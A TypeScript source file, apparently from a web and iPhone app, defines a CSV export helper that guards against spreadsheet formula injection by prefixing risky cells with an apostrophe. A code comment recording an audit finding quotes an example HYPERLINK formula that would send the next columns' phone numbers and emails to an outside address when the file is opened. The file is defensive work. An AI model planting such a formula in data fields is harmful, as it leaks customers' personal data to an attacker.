import { saveFile, type Outcome } from "./deviceActions";

// One CSV writer for every export button (2026-08-01, enterprise round P2: "it's my data").
// Client-side on the rows a panel already loaded — no new endpoints, no schema, and the file
// matches exactly what the screen shows. Excel-safe: quotes doubled, CRLF rows, UTF-8 BOM so
// accents survive a double-click open. Saved by lib/deviceActions: a download on the web, the share
// sheet in the iPhone app (Save to Files, Mail, AirDrop…), where a download goes nowhere.
//
// A CELL IS TEXT, NEVER A FORMULA (R10b, 2026-10-16 — the 10/10 audit). A name typed at sign-up, an order's name, or an
// error anyone can report went into the file as it came, and a spreadsheet runs a cell that starts with = + - @ (or a
// tab or return): `=HYPERLINK("https://…?"&C2&D2)` in a customer's name sent the next column's phones and emails
// wherever it pointed when the owner opened the export. Such a cell is written with a leading ' (OWASP's rule), which
// a spreadsheet shows as text. A number stays a number — the money columns' minus signs are not formulas.
export function csvCell(v: unknown): string {
  if (v == null) return "";
  let s = String(v);
  if (typeof v !== "number" && /^[=+\-@\t\r]/.test(s) && !/^[+-]?\d+(\.\d+)?$/.test(s)) s = `'${s}`;
  return /[",\n\r]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
}

export function downloadCsv(filename: string, rows: Record<string, unknown>[]): Promise<Outcome> {
  if (typeof window === "undefined" || rows.length === 0) return Promise.resolve("unsupported");
  const cols = Object.keys(rows[0]);
  const body = [cols.map(csvCell).join(","), ...rows.map((r) => cols.map((c) => csvCell(r[c])).join(","))].join("\r\n");
  const blob = new Blob(["﻿" + body], { type: "text/csv;charset=utf-8" });
  return saveFile(filename, blob);
}
